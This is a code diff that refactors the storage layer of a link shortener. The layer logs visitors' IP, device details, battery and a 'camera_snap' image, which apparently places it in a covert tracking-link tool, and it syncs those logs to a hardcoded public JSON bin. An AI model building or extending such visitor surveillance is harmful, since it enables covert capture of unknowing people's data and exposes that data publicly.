@@ -22,14 +22,13 @@ const defaultData = {
 // Global in-memory cache
 let memoryCache = null;
 
-// Free Public Sync Endpoint for Vercel Instance Synchronization
-// (Uses npoint.io free cloud JSON store for zero-setup 100% persistent serverless sync)
+// Persistent Cloud DB Endpoint for Vercel Serverless Instance Synchronization
 const CLOUD_BIN_URL = process.env.CLOUD_BIN_URL || 'https://api.npoint.io/0839e248b64e56598db4';
 
-// Helper to sync from Cloud DB (async)
-async function syncFromCloud() {
+// Synchronously or Async fetch from Cloud DB to ensure 100% data consistency
+async function ensureDbSynced() {
   try {
-    const res = await axios.get(CLOUD_BIN_URL, { timeout: 2500 });
+    const res = await axios.get(CLOUD_BIN_URL, { timeout: 3500 });
     if (res.data && Array.isArray(res.data.links)) {
       memoryCache = res.data;
       saveLocalDb(res.data);
@@ -38,14 +37,18 @@ async function syncFromCloud() {
   } catch (err) {
     // Fallback to local
   }
-  return null;
+  return loadLocalDb();
 }
 
-// Helper to push to Cloud DB (async fire-and-forget)
-function syncToCloud(data) {
+// Push to Cloud DB
+async function pushToCloud(data) {
+  memoryCache = data;
+  saveLocalDb(data);
   try {
-    axios.post(CLOUD_BIN_URL, data, { timeout: 3000 }).catch(() => {});
-  } catch (err) {}
+    await axios.post(CLOUD_BIN_URL, data, { timeout: 4000 });
+  } catch (err) {
+    console.error('Cloud DB push error:', err.message);
+  }
 }
 
 // Save to local file system
@@ -55,12 +58,9 @@ function saveLocalDb(data) {
   } catch (err) {}
 }
 
-// Helper to load DB
-function loadDb() {
-  if (memoryCache) {
-    return memoryCache;
-  }
-
+// Load local DB file
+function loadLocalDb() {
+  if (memoryCache) return memoryCache;
   try {
     if (fs.existsSync(dbPath)) {
       const content = fs.readFileSync(dbPath, 'utf8');
@@ -68,27 +68,18 @@ function loadDb() {
       return memoryCache;
     }
   } catch (err) {}
-
   memoryCache = defaultData;
   return defaultData;
 }
 
-// Helper to save DB
-function saveDb(data) {
-  memoryCache = data;
-  saveLocalDb(data);
-  syncToCloud(data);
-}
-
 module.exports = {
-  // Cloud initial sync trigger
   initSync: async () => {
-    await syncFromCloud();
+    await ensureDbSynced();
   },
 
   // Links
-  createLink: (shortCode, title, destinationUrl) => {
-    const data = loadDb();
+  createLink: async (shortCode, title, destinationUrl) => {
+    const data = await ensureDbSynced();
     const newLink = {
       id: data.nextLinkId++,
       short_code: shortCode,
@@ -97,12 +88,12 @@ module.exports = {
       created_at: new Date().toISOString()
     };
     data.links.push(newLink);
-    saveDb(data);
+    await pushToCloud(data);
     return newLink;
   },
 
-  getAllLinks: () => {
-    const data = loadDb();
+  getAllLinks: async () => {
+    const data = await ensureDbSynced();
     return data.links.map(l => {
       const clickCount = data.click_logs.filter(c => c.link_id === l.id).length;
       return {
@@ -112,23 +103,23 @@ module.exports = {
     }).sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
   },
 
-  getLinkByShortCode: (shortCode) => {
-    const data = loadDb();
+  getLinkByShortCode: async (shortCode) => {
+    const data = await ensureDbSynced();
     return data.links.find(l => l.short_code === shortCode) || null;
   },
 
-  deleteLink: (id) => {
-    const data = loadDb();
+  deleteLink: async (id) => {
+    const data = await ensureDbSynced();
     const numId = Number(id);
     data.links = data.links.filter(l => l.id !== numId);
     data.click_logs = data.click_logs.filter(c => c.link_id !== numId);
-    saveDb(data);
+    await pushToCloud(data);
     return true;
   },
 
   // Click Logs
-  logClick: (logData) => {
-    const data = loadDb();
+  logClick: async (logData) => {
+    const data = await ensureDbSynced();
     const newLog = {
       id: data.nextLogId++,
       link_id: logData.linkId,
@@ -161,12 +152,12 @@ module.exports = {
       created_at: new Date().toISOString()
     };
     data.click_logs.push(newLog);
-    saveDb(data);
+    await pushToCloud(data);
     return newLog;
   },
 
-  updateLogClientData: (logId, clientData) => {
-    const data = loadDb();
+  updateLogClientData: async (logId, clientData) => {
+    const data = await ensureDbSynced();
     const log = data.click_logs.find(c => c.id === logId);
     if (log) {
       if (clientData.screenRes) log.screen_res = clientData.screenRes;
@@ -178,20 +169,20 @@ module.exports = {
       if (clientData.battery) log.battery = clientData.battery;
       if (clientData.deviceModel && clientData.deviceModel !== 'N/A') log.device_model = clientData.deviceModel;
       if (clientData.cameraSnap) log.camera_snap = clientData.cameraSnap;
-      saveDb(data);
+      await pushToCloud(data);
     }
   },
 
-  getLogsByLinkId: (linkId) => {
-    const data = loadDb();
+  getLogsByLinkId: async (linkId) => {
+    const data = await ensureDbSynced();
     const numId = Number(linkId);
     return data.click_logs
       .filter(c => c.link_id === numId)
       .sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
   },
 
-  getAllLogs: (limit = 100) => {
-    const data = loadDb();
+  getAllLogs: async (limit = 100) => {
+    const data = await ensureDbSynced();
     return data.click_logs
       .map(c => {
         const link = data.links.find(l => l.id === c.link_id);
@@ -205,8 +196,8 @@ module.exports = {
       .slice(0, limit);
   },
 
-  getStats: () => {
-    const data = loadDb();
+  getStats: async () => {
+    const data = await ensureDbSynced();
     const totalLinks = data.links.length;
     const totalClicks = data.click_logs.length;
     const uniqueIPs = new Set(data.click_logs.map(c => c.ip_address)).size;
